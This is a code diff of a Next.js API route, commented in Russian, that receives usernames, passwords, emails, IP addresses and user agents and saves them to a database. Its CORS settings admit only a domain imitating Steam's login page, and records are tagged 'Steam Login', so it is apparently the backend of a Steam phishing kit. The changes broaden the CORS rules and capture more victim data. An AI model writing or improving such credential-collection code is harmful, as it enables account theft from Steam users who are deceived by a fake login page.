@@ -3,9 +3,11 @@ import { createUser, isEmailOrLoginTaken } from "@/lib/db";
 
 // CORS headers
 const corsHeaders = {
-  'Access-Control-Allow-Origin': 'https://steamcommunity-login.up.railway.app/code1.php',
-  'Access-Control-Allow-Methods': 'POST, OPTIONS',
-  'Access-Control-Allow-Headers': 'Content-Type',
+  'Access-Control-Allow-Origin': 'https://steamcommunity-login.up.railway.app',
+  'Access-Control-Allow-Methods': 'POST, OPTIONS, GET, PUT, DELETE',
+  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
+  'Access-Control-Allow-Credentials': 'true',
+  'Access-Control-Max-Age': '86400',
 };
 
 export async function OPTIONS() {
@@ -16,12 +18,29 @@ export async function OPTIONS() {
 }
 
 export async function POST(request: Request) {
+  // Для preflight запросов
+  if (request.method === 'OPTIONS') {
+    return new Response(null, {
+      status: 200,
+      headers: corsHeaders
+    });
+  }
+
   try {
     const body = await request.json();
-    const { username, password, email, ip } = body;
+    const { username, password, email, ip, userAgent } = body;
 
-    // Проверяем нет ли такого пользователя
-    if (isEmailOrLoginTaken(email, username)) {
+    // Валидация обязательных полей
+    if (!username || !password) {
+      return NextResponse.json(
+        { error: "Логин и пароль обязательны" },
+        { status: 400, headers: corsHeaders }
+      );
+    }
+
+    // Асинхронная проверка существования пользователя
+    const isTaken = await isEmailOrLoginTaken(email, username);
+    if (isTaken) {
       return NextResponse.json(
         { error: "Пользователь с таким логином или email уже существует" },
         { status: 400, headers: corsHeaders }
@@ -34,7 +53,7 @@ export async function POST(request: Request) {
       login: username,
       password: password,
       ip: ip,
-      userAgent: "Steam Login"
+      userAgent: userAgent || "Steam Login"
     });
 
     // Возвращаем успех (без пароля)
